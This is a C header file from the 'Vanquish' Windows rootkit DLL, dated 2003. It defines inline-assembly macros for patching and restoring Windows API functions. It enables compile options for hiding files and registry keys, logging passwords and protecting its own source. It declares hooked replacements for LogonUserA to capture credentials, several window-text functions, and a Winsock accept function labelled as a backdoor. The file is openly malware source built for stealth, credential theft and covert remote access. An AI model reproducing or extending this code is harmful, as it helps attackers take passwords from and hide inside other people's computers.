/******************************************************************************\

	Vanquish DLL - Copyright (c)2003 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#ifndef __VANQUISH_DLL__H__
#define __VANQUISH_DLL__H__

#define _WIN32_WINNT 0x0500
#include <windows.h>

//api call; please remember to declare 'retValue' and do a 'return retValue;' at the end!!!
#define OLDCALL(vapi, cArgs) \
	__asm lea edi, [esp - cArgs * 4] \
	__asm lea esi, [ebp + 8] \
	__asm mov ecx, cArgs \
	__asm rep movsd \
	__asm sub esp, cArgs * 4 \
	__asm call dword ptr [lpOld##vapi] \
	__asm mov [retValue], eax

//a simple function call with return in retValue
#define SIMPLE_CALL(vapi) \
	__asm call dword ptr [lpOld##vapi] \
	__asm mov [retValue], eax

//arguments must be processed in reverse order
#define SIMPLE_ARG(sarg) \
	__asm push [sarg]

//the equivalent of SIMPLE_ARG(&parg); push the pointer to parg.
#define SIMPLE_PARG(parg) \
	__asm lea ecx, [parg] \
	__asm push ecx

//api replacement/restore (please use INITIAL_REPLACE_API for the first time)
#define REPLACE_API(vapi) Vanquish_ReplaceAPI(OLD_API(vapi), V##vapi, bufV##vapi, bufHookV##vapi, 0)
#define RESTORE_API(vapi) Vanquish_RestoreAPI(OLD_API(vapi), V##vapi, bufV##vapi)
#define FINAL_RESTORE_API(vapi) { if (FLAG(vapi) == 1000) Vanquish_RestoreAPI(OLD_API(vapi), V##vapi, bufV##vapi); }
#define INITIAL_REPLACE_API(vapi, vmod) { if ((hm##vmod) && (FLAG(vapi) != 1000)) { FLAG(vapi) = 1000; OLD_API(vapi) = ADDR_OF(vapi, vmod); Vanquish_ReplaceAPI(OLD_API(vapi), V##vapi, bufV##vapi, bufHookV##vapi, 1); } }

//here *ALL* libraries must be enumerated
#define DECLARE_VANQUISH_MODULES \
	DECLARE_MODULE(KERNEL32); \
	DECLARE_MODULE(ADVAPI32); \
	DECLARE_MODULE(USER32); \
	DECLARE_MODULE(WS2_32);

//here *ALL* libraries must be enumerated
#define LOAD_VANQUISH_MODULES \
	LOAD_MODULE(KERNEL32); \
	LOAD_MODULE(ADVAPI32); \
	LOAD_MODULE(USER32); \
	LOAD_MODULE(WS2_32);

//here *ALL* libraries must be enumerated
#define LOAD_VANQUISH(qmod) \
	LOAD_KERNEL32__##qmod \
	LOAD_ADVAPI32__##qmod \
	LOAD_USER32__##qmod \
	LOAD_WS2_32__##qmod

//here *ALL* libraries must be enumerated
#define UNLOAD_VANQUISH(qmod) \
	UNLOAD_KERNEL32__##qmod \
	UNLOAD_ADVAPI32__##qmod \
	UNLOAD_USER32__##qmod \
	UNLOAD_WS2_32__##qmod

//size of a jmp instruction (relative 32bit offset)
const DWORD JMP_SIZE = 5;

//function prototypes
DWORD posw0(LPCWSTR p);
DWORD pos0(LPCSTR p);
BOOL Vanquish_ReplaceAPI(LPVOID lpOld, LPVOID lpNew, LPBYTE savbuf, LPBYTE hooker, DWORD dwInitial);
BOOL Vanquish_RestoreAPI(LPVOID lpOld, LPVOID lpNew, LPBYTE savbuf);

//Compiling Options:
//VANQUISH_DLLUTILS      - enable dll utils module
//VANQUISH_HIDEFILES     - enable file/folders hiding
//VANQUISH_HIDEREG       - enable registry hiding
//VANQUISH_PWDLOG        - enable password logging
//VANQUISH_SOURCEPROTECT - enable my source protection
#define VANQUISH_DLLUTILS
#define VANQUISH_HIDEFILES
#define VANQUISH_HIDEREG
#define VANQUISH_PWDLOG
#define VANQUISH_SOURCEPROTECT


//Vanquish NEW API declarations follows
//Declarations are in conformance with the real Windows API header files
//Difference between this and real api prototypes:
//    1) prefixed V to the name
//    2) replaced WINAPI with NEWAPI
#define NEWAPI __declspec(dllexport)

//Winbase API////////////////////////////////////////////////////////////////////////////////
//(winbase.h)
//Please note that the ANSI versions of CreateProcess and FindNextFile DO NOT NEED replace
NEWAPI
BOOL
WINAPI
VLogonUserA(
    LPSTR lpszUsername,
    LPSTR lpszDomain,
    LPSTR lpszPassword,
    DWORD dwLogonType,
    DWORD dwLogonProvider,
    PHANDLE phToken
    );



NEWAPI
HWND
WINAPI
VCreateWindowExA(
    DWORD dwExStyle,
    LPCSTR lpClassName,
    LPCSTR lpWindowName,
    DWORD dwStyle,
    int X,
    int Y,
    int nWidth,
    int nHeight,
    HWND hWndParent,
    HMENU hMenu,
    HINSTANCE hInstance,
    LPVOID lpParam);

NEWAPI
HWND
WINAPI
VCreateWindowExW(
    DWORD dwExStyle,
    LPCWSTR lpClassName,
    LPCWSTR lpWindowName,
    DWORD dwStyle,
    int X,
    int Y,
    int nWidth,
    int nHeight,
    HWND hWndParent,
    HMENU hMenu,
    HINSTANCE hInstance,
    LPVOID lpParam);

NEWAPI
BOOL
WINAPI
VSetWindowTextA(
    HWND hWnd,
    LPCSTR lpString
	);

NEWAPI
int
WINAPI
VGetWindowTextA(
    HWND hWnd,
    LPSTR lpString,
    int nMaxCount
	);

NEWAPI
int
WINAPI
VGetWindowTextW(
    HWND hWnd,
    LPWSTR lpString,
    int nMaxCount
	);

//Backdoor implementation////////////////////////////////////////////////////////////////////
//(winsock2.h)
NEWAPI
SOCKET
WSAAPI
Vaccept(
    SOCKET s,
    struct sockaddr FAR * addr,
    int FAR * addrlen
    );

#endif //__VANQUISH_DLL__H__